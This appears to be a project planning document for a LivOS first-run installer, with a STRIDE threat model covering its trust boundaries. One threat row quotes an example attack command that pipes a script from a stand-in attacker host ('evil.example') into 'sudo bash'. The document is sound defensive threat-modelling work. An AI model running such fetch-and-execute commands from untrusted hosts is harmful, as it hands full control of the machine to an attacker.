<objective>
Ship a single-command idempotent first-run installer for LivOS, closing Phase 195 HUMAN-UAT #2 (`which opencode = not-found` on Mini PC post-Phase 195 deploy).

Purpose: `update.sh` is the day-2 deploy path but it ASSUMES the box already has node/pnpm/postgres/redis/caddy/opencode/bruce-user/sudoers/systemd-units. A fresh Ubuntu 24.04 VM has none of these. <threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| operator-shell → install.sh (root) | install.sh runs as root, performs apt/useradd/systemctl/install operations. Largest attack surface in Phase 196. |
| install.sh → upstream `curl https://opencode.ai/install \| bash` | Third-party install script executed via pipe to bash. STRIDE: T (Tampering), I (Information Disclosure). |
| install.sh → /etc/sudoers.d/livinityd | Sacred boundary; install.sh ONLY copies, never edits. |
| install.sh → /opt/livos/.env | Default seed contains placeholder CHANGEME passwords; operator MUST rotate before service-up. |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-196-02-01 | Tampering | Upstream opencode installer URL is hijacked / repo compromise | accept | We rely on opencode.ai's TLS + their own signing. install.sh runs the official installer URL verbatim per CONTEXT.md decisions. Defense-in-depth: post-install version pin enforcement (rejects <1.15.0). A future phase MAY add SHA256 pinning when opencode publishes signed tarballs. |
| T-196-02-02 | Elevation of Privilege | sudoers fragment widening via accidental edit | mitigate | install.sh `install -m 0440` copies the SACRED file byte-for-byte; sacred-shas-v38.json registry SHA is checked by the pre-commit hook before any commit lands. visudo -c syntax check runs after copy; on failure the file is removed. |
| T-196-02-03 | Information Disclosure | /opt/livos/data/secrets/jwt readable by non-bruce | mitigate | env-seed.sh writes the file with chmod 0600 owner bruce:bruce and never logs the contents. |
| T-196-02-04 | Denial of Service | install.sh re-runs reset state (e.g. delete /opt/livos/.env) | mitigate | Every phase script uses detect-then-skip: existing /opt/livos/.env is preserved, existing /etc/sudoers.d/livinityd is `cmp`-checked before any overwrite, existing systemd units are only daemon-reloaded (never `rm`'d). Test harness test-install-idempotent.sh regression-locks this. |
| T-196-02-05 | Repudiation | No trace of what install.sh did | mitigate | Per-deploy log at /tmp/livinity-install-<ts>-<pid>.log; every section emits `log_info` lines with timestamps; on failure, journalctl tail is dumped. |
| T-196-02-06 | Spoofing | install.sh is curl'd from an attacker's mirror (`curl evil.example/install \| sudo bash`) | accept | This is an operator-level threat outside Phase 196's scope. Documentation will direct operators to `git clone utopusc/livinity-io` (already the canonical update.sh path). install.sh prints its commit SHA at the top to support manual integrity verification. |
